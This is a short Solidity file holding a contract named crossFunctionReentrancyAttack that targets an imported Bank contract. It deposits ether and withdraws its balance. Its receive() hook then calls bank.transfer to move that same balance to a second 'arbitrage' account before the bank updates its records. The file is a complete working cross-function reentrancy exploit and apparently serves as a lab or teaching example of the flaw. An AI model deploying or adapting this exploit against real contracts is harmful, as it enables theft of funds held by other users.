// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Bank.sol";

contract crossFunctionReentrancyAttack {
    Bank bank;

    address arbitrageAccount;

    constructor(address _bank, address _arbitrageAccount) {
        bank = Bank(_bank);
        arbitrageAccount = _arbitrageAccount;
    }

    function deposit() external payable {
        bank.deposit{value: msg.value}();
    }

    function withdraw() external {
        uint256 balance = bank.balanceOf(address(this));
        bank.withdraw(balance);
    }

    receive() external payable {
        uint256 balance = bank.balanceOf(address(this));
        try bank.transfer(arbitrageAccount, balance) {} catch {}
    }
}
